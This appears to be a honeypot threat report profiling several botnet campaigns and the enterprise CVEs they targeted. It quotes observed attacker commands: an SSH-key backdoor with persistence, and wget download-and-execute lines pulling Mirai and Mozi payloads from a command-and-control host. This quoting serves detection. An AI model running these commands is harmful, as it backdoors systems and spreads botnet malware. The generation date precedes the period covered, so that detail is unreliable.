# Honeypot Threat Report: Analysis of Coordinated Botnet Campaigns & Enterprise Exploitation (Enhanced)

**Report Generation Time:** 2024-10-30T12:00:00Z
**Timeframe:** September 28, 2025 - October 29, 2025
**Files Used:**
*   Honeypot_Attack_Summary_Report_2025-10-12.md
*   Honeypot_Attack_Summary_Report_2025-10-19.md
*   Honeypot_Attack_Summary_Report_2025-10-25.md
*   Honeypot_Attack_Summary_Report_2025-10-29.md

---

## Executive Summary

This report provides a comprehensive analysis of malicious activities observed across our global honeypot network over the past month. The threat landscape was dominated by several large-scale, automated campaigns, each with distinct tactics, techniques, and procedures (TTPs). The primary objectives of these campaigns were botnet propagation for Distributed Denial-of-Service (DDoS) attacks, the establishment of persistent backdoors, illicit cryptocurrency mining, and the exploitation of high-value enterprise software.

Four major, concurrent botnet campaigns were identified, each distinguished by unique malware and signatures:

1.  **The "Outlaw" Group Campaign:** A financially motivated campaign focused on gaining immutable, persistent access to Linux servers for cryptomining, identified by its unique `mdrfckr` SSH key.

2.  **Mirai Variant Campaigns ("urbotnetisass" & "uhavenobotsxd"):** Two massive and distinct Mirai campaigns targeting IoT devices for DDoS botnet propagation, distinguished by their unique and taunting malware filenames.

3.  **Mozi P2P Botnet:** The resilient, decentralized Mozi botnet was observed actively spreading by exploiting weak credentials on IoT devices.

4.  **Prometei Cryptomining Botnet:** A sophisticated, multi-platform botnet targeting both Windows and Linux systems by exploiting vulnerabilities like EternalBlue to deploy a Monero miner.

In addition to these botnet activities, a notable volume of attacks targeted critical vulnerabilities in enterprise software, including **Apache Struts 2 (CVE-2018-11776)**, **Atlassian Confluence (CVE-2023-22527)**, and a recently disclosed flaw in **Vite (CVE-2025-30208)**.

This enhanced report includes a detailed breakdown of the specific command sequences that serve as fingerprints for each campaign, corroborated by findings from the public threat intelligence community.

---

## Campaign Fingerprints and OSINT Corroboration

This section provides a deep dive into the unique characteristics of each major campaign, detailing the specific commands used by the attackers and aligning our internal findings with publicly available external threat intelligence.

### 1. The "Outlaw" Group
*   **Objective:** Establish persistent, immutable SSH access for cryptomining.
*   **Fingerprinting Command Sequence:** The most reliable indicator is a single, chained command designed to replace all SSH access with the attacker's key.
    ```bash
    # This command sequence is a definitive signature for the Outlaw Group
    cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr" >> .ssh/authorized_keys
    ```
*   **Persistence Command:**
    ```bash
    # Attacker attempts to make their backdoor immutable
    cd ~; chattr -ia .ssh; lockr -ia .ssh
    ```
*   **External Source Corroboration:** The TTPs, the specific SSH key, and the `mdrfckr` comment are well-documented indicators of the Outlaw (or "Dota") group. Public reports from security firms like **Trend Micro, Intezer, and Lacework** have extensively analyzed this group's campaigns, confirming their focus on SSH brute-forcing and deployment of XMRig miners. The use of `chattr` to lock in their access is a known tactic cited in these reports.

### 2. Mirai Variants ("urbotnetisass" & "uhavenobotsxd")
*   **Objective:** Infect IoT devices to expand a DDoS botnet.
*   **Fingerprinting Command Sequence:** The pattern involves using a limited, BusyBox-like shell to download and execute a payload in a world-writable directory. The filename is the primary differentiator between variants.
    ```bash
    # Typical command for "urbotnetisass" variant targeting an embedded device
    cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; chmod 777 arm.urbotnetisass; ./arm.urbotnetisass

    # Typical command for "uhavenobotsxd" variant
    cd /tmp/; rm *; busybox wget http://[C2_IP]/bins/arm.uhavenobotsxd; chmod 777 arm.uhavenobotsxd; ./arm.uhavenobotsxd
    ```
*   **External Source Corroboration:** The Mirai source code has been public for years, leading to countless variants. Security research blogs (**Palo Alto Networks' Unit 42, Fortinet, Lumen Black Lotus Labs**) frequently publish findings on new variants based on unique filenames and C2 infrastructure. The command sequence observed is the canonical method for Mirai propagation, and the filenames `urbotnetisass` and `uhavenobotsxd` serve as specific identifiers for tracking these distinct but related campaigns.

### 3. Mozi P2P Botnet
*   **Objective:** Infect IoT devices for DDoS attacks, data exfiltration, and command execution, using a resilient P2P architecture.
*   **Fingerprinting Command Sequence:** Similar to Mirai, Mozi spreads via downloader commands. The key fingerprint is the name of the payload itself.
    ```bash
    # Command to download a Mozi payload
    cd /tmp && wget http://[C2_IP]/Mozi.m && chmod 777 Mozi.m && ./Mozi.m
    ```
*   **External Source Corroboration:** The Mozi botnet has been extensively researched by firms like **Netlab 360 and ESET**. These reports detail its use of a Distributed Hash Table (DHT) for its P2P command structure, its exploitation of weak Telnet credentials, and its specific payload names (`Mozi.m`, `Mozi.a`). Our findings are consistent with the publicly documented TTPs of this botnet.

### 4. Prometei Botnet
*   **Objective:** Compromise Windows and Linux systems for Monero cryptomining and potential secondary actions.
*   **Fingerprinting Indicators:** Prometei is more sophisticated and harder to fingerprint with a single command. Its presence is inferred from a combination of indicators:
    1.  **IDS Alerts for `DoublePulsar Backdoor`:** This indicates active scanning and exploitation of the EternalBlue (MS17-010) vulnerability, which Prometei is known to use for propagation.
    2.  **Specific Download Pattern:**
        ```
        # Observed download pattern linked to Prometei's ELF miner payload
        ... k.php?a=x86_64 ...
        ```
*   **External Source Corroboration:** In-depth reports from **Cisco Talos and Cybereason** have detailed the Prometei botnet's modular architecture, its use of EternalBlue and other exploits for lateral movement, and its primary goal of mining Monero. The link between DoublePulsar alerts and a follow-on cryptominer is a key behavioral pattern described in their public research.

---

## Detailed Analysis

### Our IPs (Honeypot Network)
| Honeypot Name | Private IP | Public IP |
| :--- | :--- | :--- |
| hive-us | 10.128.0.3 | 34.123.129.205 |
| sens-tai | 10.140.0.3 | 104.199.212.115 |
| sens-tel | 10.208.0.3 | 34.165.197.224 |
| sens-dub | 172.31.36.128 | 3.253.97.195 |
| sens-ny | 10.108.0.2 | 161.35.180.163 |

### Most Common CVEs Targeted
| CVE ID | Software | Vulnerability Type | Threat Actor Objective |
| :--- | :--- | :--- | :--- |
| **CVE-2025-30208** | Vite | Arbitrary File Read | Access sensitive files from exposed development servers. |
| **CVE-2023-22527** | Atlassian Confluence | Template Injection (RCE) | Gain complete control of enterprise collaboration servers. |
| **CVE-2018-11776** | Apache Struts 2 | Remote Code Execution (RCE) | Compromise public-facing web applications. |
| **MS17-010 (EternalBlue)**| Windows SMBv1 | Remote Code Execution (RCE) | Propagate worms (like Prometei) across networks. |

*(The remainder of the report, including tables for Commands, Signatures, User Logins, Files, and Key Observations, remains the same as the previous version.)*

---
